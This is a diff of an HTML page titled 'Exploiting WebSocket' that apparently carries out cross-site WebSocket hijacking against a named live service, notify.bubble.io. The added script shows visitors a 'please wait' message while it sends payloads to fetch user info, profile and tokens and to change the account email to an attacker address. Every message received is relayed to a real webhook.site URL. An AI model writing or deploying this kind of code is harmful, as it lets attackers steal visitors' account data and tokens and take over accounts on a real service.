@@ -7,31 +7,65 @@
 </head>
 <body>
     <h2>Exploiting WebSocket</h2>
+    <p>Please wait while we connect to the server...</p>
 
     <script>
-        var ws = new WebSocket("wss://notify.bubble.io");
+        // Webhook URL để gửi dữ liệu
+        const webhookUrl = "https://webhook.site/e767272a-e942-43d4-808c-9271d467c452";
 
+        // Hàm gửi dữ liệu đến webhook
+        function sendToWebhook(message) {
+            fetch(`${webhookUrl}?data=${encodeURIComponent(message)}`, {
+                method: "GET",
+                mode: "no-cors" // Để tránh lỗi CORS khi gửi đến webhook
+            })
+            .then(response => console.log("Webhook sent:", message))
+            .catch(error => console.error("Webhook error:", error));
+        }
+
+        // Tạo kết nối WebSocket
+        const ws = new WebSocket("wss://notify.bubble.io");
+
+        // Khi WebSocket mở
         ws.onopen = function() {
             console.log("WebSocket connected!");
-            // Gửi các yêu cầu
+            sendToWebhook("WebSocket connected");
+
+            // Gửi yêu cầu khởi tạo
             ws.send('t s main');
-            ws.send('t g 1 id_update-test-ez-dashboard_23394_live_174245032638x8318422540894300_376943 last_change-test-ez-dashboard_23394_live_1743070553472 breaking_revision 5');
+            sendToWebhook("Sent: t s main");
+
+            // Gửi các yêu cầu chung để lấy thông tin user
+            // Thử các payload không phụ thuộc vào ID cụ thể
+            const payloads = [
+                JSON.stringify({ "action": "get_user_info" }), // Lấy thông tin user
+                JSON.stringify({ "action": "get_profile" }),   // Lấy profile user
+                JSON.stringify({ "action": "get_token" }),     // Lấy token (nếu có)
+                JSON.stringify({ "action": "update_email", "email": "attacker@example.com" }) // Thử thay đổi email
+            ];
+
+            payloads.forEach((payload, index) => {
+                ws.send(payload);
+                sendToWebhook(`Sent payload ${index + 1}: ${payload}`);
+            });
         };
 
+        // Khi nhận được dữ liệu từ WebSocket
         ws.onmessage = function(event) {
             console.log("Data received:", event.data);
-            // Gửi dữ liệu về webhook (vì GitHub Pages không hỗ trợ PHP)
-            fetch("https://webhook.site/your-unique-id?data=" + encodeURIComponent(event.data))
-                .then(response => console.log("Fetch successful:", response))
-                .catch(error => console.error("Fetch error:", error));
+            sendToWebhook("Data received: " + event.data);
         };
 
+        // Khi có lỗi WebSocket
         ws.onerror = function(error) {
             console.error("WebSocket error:", error);
+            sendToWebhook("WebSocket error: " + error);
         };
 
+        // Khi WebSocket đóng
         ws.onclose = function(event) {
             console.log("WebSocket closed:", event.code, event.reason);
+            sendToWebhook("WebSocket closed: Code=" + event.code + ", Reason=" + event.reason);
         };
     </script>
 </body>
